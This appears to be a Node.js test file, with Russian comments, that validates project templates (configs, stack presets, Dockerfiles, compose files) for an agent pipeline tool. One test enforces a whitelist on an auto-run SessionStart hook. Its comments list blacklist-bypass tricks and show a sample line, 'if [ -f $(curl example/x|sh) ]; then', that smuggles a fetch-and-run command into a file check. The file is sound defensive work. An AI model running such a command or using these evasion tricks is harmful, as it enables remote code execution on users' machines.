import test from 'node:test';
import assert from 'node:assert/strict';
import { readText } from './read-text.mjs';
import { parseConfig } from '../src/config.mjs';

test('заготовка конфига после подстановки значений валидна', () => {
  const tmpl = readText('templates/common/config.yml.tmpl');
  const filled = tmpl
    .replaceAll('{{NAME}}', 'my-app')
    .replaceAll('{{STACK}}', 'node-ts')
    .replaceAll('{{GOAL}}', 'тестовая цель')
    .replaceAll('{{AUTONOMY}}', 'prod-gate')
    .replaceAll('{{STAGE}}', 'sketch');
  const cfg = parseConfig(filled);
  assert.equal(cfg.project.name, 'my-app');
  assert.equal(cfg.stage, 'sketch');
});

test('заготовка объясняет, что файл ведёт агент', () => {
  const tmpl = readText('templates/common/config.yml.tmpl');
  assert.match(tmpl, /pipeline:reconfigure/);
});

test('пресет node-ts содержит команды проверок и список обязательных', () => {
  const preset = JSON.parse(readText('templates/stacks/node-ts/preset.json'));
  assert.ok(Object.hasOwn(preset.checks, 'test'));
  assert.ok(Object.hasOwn(preset.checks, 'build'));
  assert.ok(Array.isArray(preset.required));
  for (const name of preset.required) {
    assert.ok(Object.hasOwn(preset.checks, name), `required ссылается на ${name}, которого нет в checks`);
  }
});

test('smoke-тест шаблона не зависит от кода проекта', () => {
  const smoke = readText('templates/stacks/node-ts/smoke.test.mjs');
  assert.match(smoke, /node:test/);
  assert.equal(smoke.includes('../src/'), false);
});

test('настройки шаблона объявляют SessionStart-хук', () => {
  const settings = JSON.parse(readText('templates/common/claude-settings.json'));
  const entries = settings.hooks.SessionStart;
  assert.ok(Array.isArray(entries) && entries.length > 0);
  assert.match(JSON.stringify(entries), /pipeline-status\.sh/);
});

// Хук приезжает вместе со скачанным шаблоном и Claude Code исполняет его сам, на SessionStart,
// раньше, чем человек успевает его прочитать. Поэтому нельзя проверять "нет ли в тексте плохих
// слов" — чёрный список (curl, wget, npm install, ...) обходится тривиально командами вроде
// nc, tee, dd, scp, node -e, python3 -c, sed -i или косвенным вызовом через переменную
// (c=curl; $c ...). Единственная надёжная проверка — белый список: у хука есть ровно пять
// разрешённых форм строк, и любая строка, не подходящая ни под одну из них, обязана валить тест.
test('SessionStart-хук построен на белом списке разрешённых конструкций', () => {
  const hook = readText('templates/common/hooks/pipeline-status.sh');
  const lines = hook.split('\n');

  const isShebang = (line) => /^#!/.test(line);
  const isComment = (line) => /^\s*#/.test(line);
  // echo только с буквальным текстом в двойных кавычках: без `"`, `$` и обратных кавычек
  // внутри — это исключает подстановку команд и переменных внутри самой строки echo.
  const isEcho = (line) => /^\s*echo\s+"[^"$`]*"\s*$/.test(line);
  const isElse = (line) => /^\s*else\s*$/.test(line);
  const isFi = (line) => /^\s*fi\s*$/.test(line);
  // Проверка существования файла вида `[ -f <путь> ]; then`, единственная форма условия if.
  // Путь ограничен безопасными символами намеренно: оболочка раскрывает `$(...)`, `` ` `` и `$VAR`
  // в аргументе -f до того, как проверит файл, поэтому `\S+` здесь пропускал бы строку вида
  // `if [ -f $(curl example/x|sh) ]; then` — ровно то, что белый список обязан ловить.
  const isFileExistsCheck = (line) => /^\s*if\s+\[\s+-f\s+[A-Za-z0-9._/-]+\s+\]\s*;\s*then\s*$/.test(line);

  lines.forEach((line, index) => {
    if (line.trim() === '') return;
    const lineNumber = index + 1;
    const allowed = lineNumber === 1
      ? isShebang(line)
      : isComment(line) || isEcho(line) || isFileExistsCheck(line) || isElse(line) || isFi(line);
    assert.ok(
      allowed,
      `строка ${lineNumber} не входит в белый список разрешённых конструкций хука: ${JSON.stringify(line)}`,
    );
  });

  assert.match(hook, /echo/);
});


for (const stack of ['node-ts', 'java', 'python', 'go']) {
  test(`шаблон compose стека ${stack} берёт тег образа из переменной`, () => {
    // Один и тот же файл обслуживает выкатку и откат: подставляется другой IMAGE.
    // Прибитый тег сделал бы откат невозможным.
    const compose = readText(`templates/stacks/${stack}/compose.yml`);
    assert.match(compose, /image: \$\{IMAGE\}/);
    assert.equal(/image: .*:latest/.test(compose), false);
  });
}

for (const build of ['maven', 'gradle']) {
  test(`пресет java/${build} ссылается только на существующие проверки`, () => {
    const preset = JSON.parse(readText(`templates/stacks/java/preset-${build}.json`));
    assert.ok(Object.hasOwn(preset.checks, 'test'));
    for (const name of preset.required) {
      assert.ok(Object.hasOwn(preset.checks, name), `required ссылается на ${name}, которого нет в checks`);
    }
  });

  test(`пресет java/${build} вызывает обёртку своей системы сборки`, () => {
    const preset = JSON.parse(readText(`templates/stacks/java/preset-${build}.json`));
    const wrapper = build === 'gradle' ? './gradlew' : './mvnw';
    const other = build === 'gradle' ? './mvnw' : './gradlew';
    const commands = Object.values(preset.checks).join(' ');
    assert.ok(commands.includes(wrapper), `команды должны идти через ${wrapper}`);
    assert.equal(commands.includes(other), false, `в пресете ${build} не должно быть ${other}`);
  });

  test(`Dockerfile java/${build} берёт артефакт из каталога своей системы сборки`, () => {
    const dockerfile = readText(`templates/stacks/java/Dockerfile.${build}`);
    const expected = build === 'gradle' ? /build\/libs\/\*\.jar/ : /target\/\*\.jar/;
    assert.match(dockerfile, expected);
    assert.match(dockerfile, /eclipse-temurin:\d+-jre/, 'финальный образ должен быть на JRE, а не на JDK');
  });
}

for (const build of ['pip', 'poetry', 'uv']) {
  test(`пресет python/${build} вызывает свой менеджер зависимостей`, () => {
    const preset = JSON.parse(readText(`templates/stacks/python/preset-${build}.json`));
    const commands = Object.values(preset.checks).join(' ');
    const expected = { pip: 'python -m', poetry: 'poetry run', uv: 'uv run' }[build];
    assert.ok(commands.includes(expected), `команды должны идти через ${expected}`);
    for (const other of ['poetry run', 'uv run'].filter((p) => p !== expected)) {
      assert.equal(commands.includes(other), false, `в пресете ${build} не должно быть ${other}`);
    }
  });

  test(`пресет python/${build} ссылается только на существующие проверки`, () => {
    const preset = JSON.parse(readText(`templates/stacks/python/preset-${build}.json`));
    assert.ok(Object.hasOwn(preset.checks, 'test'));
    for (const name of preset.required) {
      assert.ok(Object.hasOwn(preset.checks, name), `required ссылается на ${name}, которого нет в checks`);
    }
  });

  test(`Dockerfile python/${build} не тащит сборочные инструменты в финальный образ`, () => {
    // Многостадийность здесь не украшение: без неё в образе остаются pip,
    // компиляторы и заголовки, то есть лишний вес и лишняя поверхность атаки.
    const dockerfile = readText(`templates/stacks/python/Dockerfile.${build}`);
    assert.match(dockerfile, /AS build/);
    assert.match(dockerfile, /COPY --from=build/);
  });
}

test('пресет go ссылается только на существующие проверки', () => {
  const preset = JSON.parse(readText('templates/stacks/go/preset.json'));
  assert.ok(Object.hasOwn(preset.checks, 'test'));
  for (const name of preset.required) {
    assert.ok(Object.hasOwn(preset.checks, name), `required ссылается на ${name}, которого нет в checks`);
  }
});

test('Dockerfile go собирает статический бинарник', () => {
  // Без CGO_ENABLED=0 бинарник тянет за собой libc и не запускается
  // в distroless-образе, где её нет.
  const dockerfile = readText('templates/stacks/go/Dockerfile');
  assert.match(dockerfile, /CGO_ENABLED=0/);
  assert.match(dockerfile, /COPY --from=build/);
});

test('smoke-тесты новых стеков не зависят от кода проекта', () => {
  assert.match(readText('templates/stacks/python/tests/test_smoke.py'), /def test_/);
  const goSmoke = readText('templates/stacks/go/smoke_test.go');
  assert.match(goSmoke, /func Test/);
  assert.match(goSmoke, /package main/);
});
